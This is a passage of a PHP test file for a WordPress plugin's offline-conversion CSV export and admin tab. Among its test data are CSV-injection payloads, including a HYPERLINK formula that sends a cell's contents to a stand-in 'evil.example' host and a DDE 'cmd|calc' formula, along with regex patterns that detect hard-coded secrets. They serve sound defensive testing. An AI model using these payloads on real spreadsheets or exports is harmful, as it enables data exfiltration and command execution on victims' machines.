		assert_same( array( 'Cj0KCQjwTESTCLICKID1234', 'Catering order won', '2026-10-14 04:30:00+0000', '1250.50', 'AUD', 'DB-Q-AAAAAA' ), $rows[2], 'won row: 15:30 AEDT (+11) is 04:30 UTC' );
		assert_same( "\r\n", substr( $result['csv'], -2 ), 'CRLF line ends' );

		$quoted_only = DoughBoss_Growth_Offline_Export::build( 'quoted', $from, $to );
		assert_same( 1, $quoted_only['rows'], 'quotes only' );
		$paid_only = DoughBoss_Growth_Offline_Export::build( 'paid', $from, $to );
		assert_same( 1, $paid_only['rows'], 'paid only' );
		assert_contains( 'Catering order won', $paid_only['csv'], 'it is the won row' );
	}
);

db_test(
	'export: only consented, accepted, in-window, not-lost rows; every exclusion is counted; a zero total leaves the value empty',
	function () {
		dbgr_cv_start();
		$base = array( 'quoted_at' => '2026-09-28 09:15:00', 'balance_paid_at' => '2026-10-14 15:30:00', 'status' => 'paid' );
		// 1: exported.
		dbgr_cv_enquiry( 1, array_merge( $base, array( 'enquiry_number' => 'DB-Q-GOOD01' ) ) );
		dbgr_cv_subject( 'enquiry', 1, 1, 1 );
		// 2: no advertising consent (the click id is dropped by the record itself, and the snapshot says no).
		dbgr_cv_enquiry( 2, array_merge( $base, array( 'enquiry_number' => 'DB-Q-NOCONS' ) ) );
		dbgr_cv_subject( 'enquiry', 2, 1, 0 );
		// 3: advertising consent but no click id at all.
		dbgr_cv_enquiry( 3, array_merge( $base, array( 'enquiry_number' => 'DB-Q-NOGCLD' ) ) );
		dbgr_cv_subject( 'enquiry', 3, 1, 1, array( 'utmSource' => 'test' ) );
		// 4: gbraid only (not exported in this version).
		dbgr_cv_enquiry( 4, array_merge( $base, array( 'enquiry_number' => 'DB-Q-GBRAID' ) ) );
		dbgr_cv_subject( 'enquiry', 4, 1, 1, array( 'gbraid' => 'Cj0KCQjwTESTGBRAID1234' ) );
		// 5: lost after being paid (a won conversion is withdrawn); its quote still stands.
		dbgr_cv_enquiry( 5, array_merge( $base, array( 'enquiry_number' => 'DB-Q-LOST01', 'status' => 'lost' ) ) );
		dbgr_cv_subject( 'enquiry', 5, 1, 1 );
		// 6: outside the window.
		dbgr_cv_enquiry( 6, array_merge( $base, array( 'enquiry_number' => 'DB-Q-OLD001', 'quoted_at' => '2026-01-05 09:00:00', 'balance_paid_at' => '2026-01-20 09:00:00' ) ) );
		dbgr_cv_subject( 'enquiry', 6, 1, 1 );
		// 7: never quoted, never paid.
		dbgr_cv_enquiry( 7, array( 'enquiry_number' => 'DB-Q-NEW001', 'status' => 'new', 'quoted_at' => '0000-00-00 00:00:00', 'balance_paid_at' => null ) );
		dbgr_cv_subject( 'enquiry', 7, 1, 1 );
		// 8: not in AUD.
		dbgr_cv_enquiry( 8, array_merge( $base, array( 'enquiry_number' => 'DB-Q-USD001', 'currency' => 'USD' ) ) );
		dbgr_cv_subject( 'enquiry', 8, 1, 1 );
		// 9: zero total: the row is written with an empty value.
		dbgr_cv_enquiry( 9, array_merge( $base, array( 'enquiry_number' => 'DB-Q-ZERO01', 'quote_total' => '0.00' ) ) );
		dbgr_cv_subject( 'enquiry', 9, 1, 1 );
		// 10: the enquiry vanished from core.
		dbgr_cv_subject( 'enquiry', 10, 1, 1 );
		// 11: an order record in the attribution table is not an enquiry.
		dbgr_cv_subject( 'order', 11, 1, 1 );
		// 12: a malformed enquiry number.
		dbgr_cv_enquiry( 12, array_merge( $base, array( 'enquiry_number' => '=SUM(A1)' ) ) );
		dbgr_cv_subject( 'enquiry', 12, 1, 1 );
		// 13: no total at all.
		dbgr_cv_enquiry( 13, array_merge( $base, array( 'enquiry_number' => 'DB-Q-NOTOT1', 'quote_total' => 'n/a' ) ) );
		dbgr_cv_subject( 'enquiry', 13, 1, 1 );

		list( $from, $to ) = dbgr_cv_window();
		$result            = DoughBoss_Growth_Offline_Export::build( 'both', $from, $to );
		$by_order          = array();
		foreach ( array_slice( dbgr_cv_csv_rows( $result['csv'] ), 1 ) as $row ) {
			$by_order[ $row[5] ][] = $row[1] . '|' . $row[3];
		}
		ksort( $by_order );
		assert_same(
			array(
				'DB-Q-GOOD01' => array( 'Catering quote sent|1250.00', 'Catering order won|1250.00' ),
				'DB-Q-LOST01' => array( 'Catering quote sent|1250.00' ),
				'DB-Q-ZERO01' => array( 'Catering quote sent|', 'Catering order won|' ),
			),
			$by_order,
			'only the eligible rows, the lost lead keeps its quote but is not won, a zero total has an empty value'
		);
		$s = $result['skipped'];
		assert_same( 1, $s['no_advertising_consent'], 'counted: no advertising consent' );
		assert_same( 2, $s['no_click_id'], 'counted: no click id at all, and gbraid only' );
		assert_same( 1, $s['lost'], 'counted: lost' );
		assert_same( 1, $s['no_enquiry'], 'counted: vanished enquiry' );
		assert_same( 1, $s['currency_not_aud'], 'counted: currency' );
		assert_same( 1, $s['no_enquiry_number'], 'counted: malformed number' );
		assert_same( 1, $s['no_valid_amount'], 'counted: unreadable total' );
		assert_same( 2, $s['outside_window'], 'counted: both stages of the old lead' );
		assert_false( isset( $s['truncated'] ), 'not truncated' );
		assert_not_contains( 'GBRAID', $result['csv'], 'a gbraid-only lead is not exported' );
	}
);

db_test(
	'export: CSV injection is neutralised. A planted click id that starts with a formula character (or contains one that breaks the allow-list) never reaches the file; csv_cell() prefixes any formula cell; quoting is RFC 4180',
	function () {
		dbgr_cv_start();
		$base = array( 'quoted_at' => '2026-09-28 09:15:00', 'balance_paid_at' => '2026-10-14 15:30:00', 'status' => 'paid' );
		$evil = array(
			6  => '=HYPERLINK("http://evil.example/?x="&A1)',
			7  => '+1+cmd|calc!A0',
			8  => '@SUM(1+1)',
			9  => '-2+3',
			10 => "\tTAB1234567890", // The attribution sanitiser trims the tab, leaving a clean id: it is exported without the tab.
			11 => "line\nbreak123456", // Control characters: the attribution sanitiser drops the value, so there is no click id.
			12 => 'has,comma,1234567',
			13 => 'short',
		);
		foreach ( $evil as $id => $gclid ) {
			dbgr_cv_enquiry( $id, array_merge( $base, array( 'enquiry_number' => 'DB-Q-EVIL' . $id ) ) );
			dbgr_cv_subject( 'enquiry', $id, 1, 1, array( 'gclid' => $gclid ) );
		}
		dbgr_cv_enquiry( 20, array_merge( $base, array( 'enquiry_number' => 'DB-Q-FINE20' ) ) );
		dbgr_cv_subject( 'enquiry', 20, 1, 1, array( 'gclid' => 'Cj0KCQjwFINECLICK_ID-20' ) );
		list( $from, $to ) = dbgr_cv_window();
		$result            = DoughBoss_Growth_Offline_Export::build( 'both', $from, $to );
		assert_same( 4, $result['rows'], 'two enquiries with a clean click id (the tab-prefixed one is trimmed by the sanitiser) produced a quote row and a won row each' );
		$cells = array();
		foreach ( dbgr_cv_csv_rows( $result['csv'] ) as $row ) {
			foreach ( $row as $cell ) {
				$cells[] = $cell;
			}
		}
		foreach ( $cells as $cell ) {
			assert_same( 0, preg_match( '/^[=+\-@\t\r]/', $cell ), 'no cell starts with a formula character: ' . substr( $cell, 0, 20 ) );
		}
		assert_not_contains( 'HYPERLINK', $result['csv'], 'the planted formula is nowhere in the file' );
		assert_not_contains( 'cmd|calc', $result['csv'], 'nor the pipe formula' );
		assert_same( 6, $result['skipped']['click_id_not_accepted'], 'six planted ids were refused by the allow-list (formulas, a comma and a too-short id)' );
		assert_same( 1, $result['skipped']['no_click_id'], 'the control-character id never made it into the stored record' );
		assert_contains( 'TAB1234567890', $result['csv'], 'the trimmed id is exported clean' );

		// The cell neutraliser as a second line of defence (and a negative control for the allow-list: it is the only
		// thing between a hostile string and the file if the allow-list were ever loosened).
		foreach ( array( '=1+1', '+1', '-1', '@x', "\tx", "\rx" ) as $hostile ) {
			assert_same( "'" . $hostile, DoughBoss_Growth_Offline_Export::csv_cell( $hostile ), 'csv_cell prefixes ' . json_encode( $hostile ) );
		}
		assert_same( 'plain', DoughBoss_Growth_Offline_Export::csv_cell( 'plain' ), 'plain text unchanged' );
		assert_same( '1250.50', DoughBoss_Growth_Offline_Export::csv_cell( '1250.50' ), 'a number unchanged' );
		assert_same( '', DoughBoss_Growth_Offline_Export::csv_cell( null ), 'null is empty' );
		assert_same( "\"a,b\",\"say \"\"hi\"\"\",'=x\r\n", DoughBoss_Growth_Offline_Export::csv_line( array( 'a,b', 'say "hi"', '=x' ) ), 'RFC 4180 quoting and neutralising together' );
	}
);

db_test(
	'export: invalid input and storage problems produce no file (null), never a partial one',
	function () {
		dbgr_cv_start();
		list( $from, $to ) = dbgr_cv_window();
		assert_same( null, DoughBoss_Growth_Offline_Export::build( 'weekly', $from, $to ), 'unknown stage' );
		assert_same( null, DoughBoss_Growth_Offline_Export::build( 'both', $to, $from ), 'window reversed' );
		assert_same( null, DoughBoss_Growth_Offline_Export::build( 'both', '2026-09-01', $to ), 'dates must be timestamps' );
		$GLOBALS['wpdb']->fail_on( '/FROM wp_doughboss_growth_attribution/' );
		assert_same( null, DoughBoss_Growth_Offline_Export::build( 'both', $from, $to ), 'a database error produces no file' );
		$GLOBALS['wpdb']->clear_failures();
		$empty = DoughBoss_Growth_Offline_Export::build( 'both', $from, $to );
		assert_same( 0, $empty['rows'], 'an empty table is an empty (header-only) file' );
		assert_same( 'Google Click ID,Conversion Name,Conversion Time,Conversion Value,Conversion Currency,Order ID' . "\r\n", $empty['csv'], 'header only' );
		assert_same( null, DoughBoss_Growth_Offline_Export::parse_site_time( '0000-00-00 00:00:00' ), 'zero date' );
		assert_same( null, DoughBoss_Growth_Offline_Export::parse_site_time( '2026-02-30 10:00:00' ), 'impossible date' );
		assert_same( null, DoughBoss_Growth_Offline_Export::parse_site_time( null ), 'null' );
		assert_same( null, DoughBoss_Growth_Offline_Export::parse_site_time( '2026-10-14' ), 'no time' );
		assert_same( null, DoughBoss_Growth_Offline_Export::parse_date( '2026-13-01', false ), 'month 13' );
		assert_same( null, DoughBoss_Growth_Offline_Export::parse_date( '14/10/2026', false ), 'wrong format' );
		assert_same( 1791896400, DoughBoss_Growth_Offline_Export::parse_date( '2026-10-14', false ), '2026-10-14 00:00 AEDT is 2026-10-13 13:00 UTC' );
		assert_same( 1791896400 + 86399, DoughBoss_Growth_Offline_Export::parse_date( '2026-10-14', true ), 'end of day' );
	}
);

db_test(
	'export: the page size and row cap bound the work (more subjects than one page are all read; the cap marks the file truncated)',
	function () {
		dbgr_cv_start();
		$base = array( 'quoted_at' => '2026-09-28 09:15:00', 'status' => 'quoted' );
		for ( $i = 1; $i <= 205; $i++ ) {
			dbgr_cv_enquiry( $i, array_merge( $base, array( 'enquiry_number' => 'DB-Q-P' . str_pad( (string) $i, 4, '0', STR_PAD_LEFT ) ) ) );
			dbgr_cv_subject( 'enquiry', $i, 1, 1 );
		}
		list( $from, $to ) = dbgr_cv_window();
		$result            = DoughBoss_Growth_Offline_Export::build( 'quoted', $from, $to );
		assert_same( 205, $result['rows'], 'both pages were read (200 + 5)' );
		assert_false( isset( $result['skipped']['truncated'] ), 'under the cap' );
	}
);

db_test(
	'export handler: manager capability AND nonce AND the feature flag; bad stage or dates download nothing; success sends a CSV with safe headers and no secret',
	function () {
		dbgr_cv_start();
		dbgr_cv_enquiry( 5, array( 'enquiry_number' => 'DB-Q-AAAAAA', 'quoted_at' => '2026-09-30 10:00:00', 'status' => 'quoted' ) );
		dbgr_cv_subject( 'enquiry', 5, 1, 1 );
		$action = DoughBoss_Growth_Offline_Export::ACTION;
		$die    = function ( $fn ) {
			ob_start();
			try {
				call_user_func( $fn );
			} catch ( DBGR_Test_Die $e ) {
				ob_end_clean();
				return $e;
			}
			$out = ob_get_clean();
			return $out;
		};

		// No login.
		$_POST = $_REQUEST = array( '_wpnonce' => wp_create_nonce( $action ) );
		$e     = $die( array( 'DoughBoss_Growth_Offline_Export', 'handle_export' ) );
		assert_true( $e instanceof DBGR_Test_Die && 403 === $e->args['response'], 'anonymous: 403' );

		// A logged-in user without the capability.
		dbgr_test_login( array( 'read' ) );
		$_POST = $_REQUEST = array( '_wpnonce' => wp_create_nonce( $action ) );
		$e     = $die( array( 'DoughBoss_Growth_Offline_Export', 'handle_export' ) );
		assert_true( $e instanceof DBGR_Test_Die && 403 === $e->args['response'], 'no capability: 403' );

		// Capability but no nonce, a wrong nonce, and another action's nonce.
		dbgr_test_login( array( 'manage_doughboss' ) );
		foreach ( array( array(), array( '_wpnonce' => 'abcdef1234' ), array( '_wpnonce' => wp_create_nonce( 'doughboss_growth_save_settings' ) ) ) as $post ) {
			$_POST = $_REQUEST = $post;
			$e     = $die( array( 'DoughBoss_Growth_Offline_Export', 'handle_export' ) );
			assert_true( $e instanceof DBGR_Test_Die && 403 === $e->args['response'], 'bad nonce: 403' );
		}

		// Bad stage and bad dates.
		foreach ( array( array( 'stage' => 'everything' ), array( 'from' => '2026-13-45' ), array( 'to' => 'yesterday' ), array( 'from' => '2026-10-10', 'to' => '2026-10-01' ) ) as $post ) {
			$_POST = $_REQUEST = array_merge( array( '_wpnonce' => wp_create_nonce( $action ) ), $post );
			$e     = $die( array( 'DoughBoss_Growth_Offline_Export', 'handle_export' ) );
			assert_true( $e instanceof DBGR_Test_Die && 400 === $e->args['response'], 'bad input downloads nothing: ' . wp_json_encode( $post ) );
		}

		// Success with the default window (the last seven days) and a posted stage.
		$_POST = $_REQUEST = array( '_wpnonce' => wp_create_nonce( $action ), 'stage' => 'quoted' );
		ob_start();
		DoughBoss_Growth_Offline_Export::handle_export();
		$csv = ob_get_clean();
		$rows = dbgr_cv_csv_rows( $csv );
		assert_same( 2, count( $rows ), 'header and one row' );
		assert_same( 'Catering quote sent', $rows[1][1], 'the quote row' );
		assert_same( '2026-09-30 00:00:00+0000', $rows[1][2], '10:00 AEST (+10) on the 30th is 00:00 UTC' );
		assert_contains( 'Cache-Control: no-cache', implode( "\n", $GLOBALS['dbgr_headers'] ), 'nocache headers were sent' );
		assert_not_contains( DBGR_CV_GA4_SECRET, $csv, 'no secret in the file' );
		assert_not_contains( 'jane.citizen', $csv, 'no personal data in the file' );

		// Feature off: the handler refuses even for a manager with a good nonce.
		update_option( DoughBoss_Growth_Settings::OPTION, array( 'features' => array( 'server_conversions' => false ) ) );
		$_POST = $_REQUEST = array( '_wpnonce' => wp_create_nonce( $action ) );
		$e     = $die( array( 'DoughBoss_Growth_Offline_Export', 'handle_export' ) );
		assert_true( $e instanceof DBGR_Test_Die && 403 === $e->args['response'], 'feature off: 403' );
	}
);

/* ---------------------------------------------------------------------------------------------------------- */
/* Admin tab                                                                                                   */
/* ---------------------------------------------------------------------------------------------------------- */

db_test(
	'admin tab: managers only; shows readiness and queue counts, the [CONFIRM] gaps and the export form with a nonce; shows no secret value, escapes output',
	function () {
		dbgr_cv_start( array( 'hashed' => true ) );
		dbgr_cv_order( 17 );
		dbgr_cv_subject( 'order', 17, 1, 1 );
		do_action( 'doughboss_order_created', 17, array() );

		ob_start();
		DoughBoss_Growth_Conversions::render_tab();
		assert_same( '', ob_get_clean(), 'a visitor sees nothing' );

		dbgr_test_login( array( 'manage_doughboss' ) );
		ob_start();
		DoughBoss_Growth_Conversions::render_tab();
		$html = ob_get_clean();
		assert_contains( 'Server-side conversions', $html, 'heading' );
		assert_contains( 'GA4 destination ready', $html, 'GA4 readiness row' );
		assert_matches( '#<td>ga4</td><td>pending</td><td>1</td>#', $html, 'queue counts by channel and status' );
		assert_matches( '#<td>meta</td><td>pending</td><td>1</td>#', $html, 'Meta queue count' );
		assert_not_contains( '[CONFIRM', $html, 'no bracket marker reaches the owner' );
		assert_not_contains( 'Elie', $html, 'the owner is not named in the tab' );
		assert_contains( 'privacy policy', $html, 'the privacy-policy gap' );
		assert_contains( 'name="action" value="doughboss_growth_export_offline_conversions"', $html, 'export form action' );
		assert_contains( 'name="_wpnonce"', $html, 'export form nonce' );
		assert_contains( 'Nothing is uploaded for you', $html, 'says nothing is uploaded' );
		assert_not_contains( DBGR_CV_GA4_SECRET, $html, 'no GA4 secret' );
		assert_not_contains( DBGR_CV_META_TOKEN, $html, 'no Meta token' );
		assert_not_contains( 'jane.citizen', $html, 'no personal data' );
		assert_not_contains( '<script', $html, 'no script' );

		$gaps = DoughBoss_Growth_Conversions::confirm_gaps();
		assert_false( isset( $gaps['ga4_destination'] ) || isset( $gaps['meta_destination'] ), 'configured destinations are not gaps' );
		foreach ( $gaps as $code => $text ) {
			assert_same( '[CONFIRM:', substr( $text, 0, 9 ), 'gap ' . $code . ' starts with [CONFIRM:' );
		}
		dbgr_cv_env( array() );
		$gaps = DoughBoss_Growth_Conversions::confirm_gaps();
		assert_true( isset( $gaps['ga4_destination'] ) && isset( $gaps['meta_destination'] ), 'missing secrets are surfaced as gaps' );
	}
);

db_test(
	'admin tab: registered on doughboss_growth_admin_tabs and the page renders it through the shell',
	function () {
		dbgr_cv_start();
		dbgr_test_login( array( 'manage_doughboss' ) );
		$_GET = array( 'tab' => 'conversions' );
		ob_start();
		DoughBoss_Growth_Admin::render_page();
		$html = ob_get_clean();
		assert_contains( 'Server-side conversions', $html, 'the tab body is on the page' );
		assert_contains( 'nav-tab-active', $html, 'the tab is selected' );
	}
);

/* ---------------------------------------------------------------------------------------------------------- */
/* Hygiene                                                                                                     */
/* ---------------------------------------------------------------------------------------------------------- */

db_test(
	'hygiene: the four module files have an ABSPATH guard, never call wp_remote_* directly, hard-code no provider URL or secret, mention no teaser word or hero work, and define classes only',
	function () {
		$dir = dirname( __DIR__ ) . '/includes/conversions/';
		$files = glob( $dir . '*.php' );
		assert_count( 4, $files, 'exactly the four module files' );
		foreach ( $files as $path ) {
			$text = (string) file_get_contents( $path );
			$name = basename( $path );
			assert_matches( "/defined\\(\\s*'ABSPATH'\\s*\\)/", $text, $name . ': ABSPATH guard' );
			assert_same( 0, preg_match( '/\bwp_(safe_)?remote_(request|get|post|head)\s*\(/', $text ), $name . ': no direct wp_remote_*' );
			assert_same( 0, preg_match( '#https?://(www\.)?(google|facebook|graph\.facebook|googletagmanager|square|squareup)#i', $text ), $name . ': no hard-coded provider URL' );
			assert_same( 0, preg_match( '/(api[_-]?secret|capi[_-]?token|bearer)\s*[=:]\s*[\'"][A-Za-z0-9_\-]{12,}/i', $text ), $name . ': no secret literal' );
			assert_same( 0, preg_match( '/minis/i', $text ), $name . ': no working-name word' );
			assert_same( 0, preg_match( '/' . 'her' . 'o|web' . 'gl|can' . 'vas/i', $text ), $name . ': no cancelled hero work' ); // Built in pieces so the scope scan in test-core-scripts.php does not flag this file.
			assert_same( 0, preg_match( '/\b(error_log|var_dump|print_r)\s*\(/', $text ), $name . ': no stray debug output' );
			assert_same( 0, preg_match( '/\$_(GET|REQUEST|COOKIE|SERVER)\b/', $text ), $name . ': reads no request data other than the nonce-checked POST' );
			assert_same( 0, preg_match( '/\$wpdb->(insert|update|delete|replace)\s*\(/', $text ), $name . ': no write helper (the only write is the shared outbox)' );
			assert_same( 0, preg_match( '/(update|add|delete)_option\s*\(/', $text ), $name . ': writes no option' );
			assert_same( 0, preg_match( '/(add_role|add_cap|register_post_type|setcookie)\s*\(/', $text ), $name . ': creates no role, capability, post type or cookie' );
		}
		// Negative control for the provider-URL check.
		assert_same( 1, preg_match( '#https?://(www\.)?(google|facebook|graph\.facebook|googletagmanager|square|squareup)#i', 'x = "https://www.google-analytics.com/mp/collect"' ), 'control: the scan pattern would catch a hard-coded URL' );
	}
);

db_test(
	'hygiene: the module never writes a core table, option or hook result (the harness records no foreign write during a full queue-and-deliver cycle)',
	function () {
		dbgr_test_clear_foreign_writes();
		dbgr_cv_start();
		dbgr_cv_order( 17 );
		dbgr_cv_subject( 'order', 17, 1, 1 );
		do_action( 'doughboss_order_created', 17, array() );
		dbgr_test_http_expect( '#^https://www\.google-analytics\.com/#', dbgr_test_http_response( 204, '' ) );
		dbgr_test_http_expect( '#^https://graph\.facebook\.com/#', dbgr_test_http_response( 200, '{}' ) );
		dbgr_cv_dispatch();
		assert_same( array(), $GLOBALS['dbgr_foreign_writes'], 'no foreign write' );
		assert_same( array(), $GLOBALS['wpdb']->foreign_writes, 'no foreign table write' );
	}
);

// Leave the process environment clean for the tests that run after this file.
dbgr_cv_env( array() );
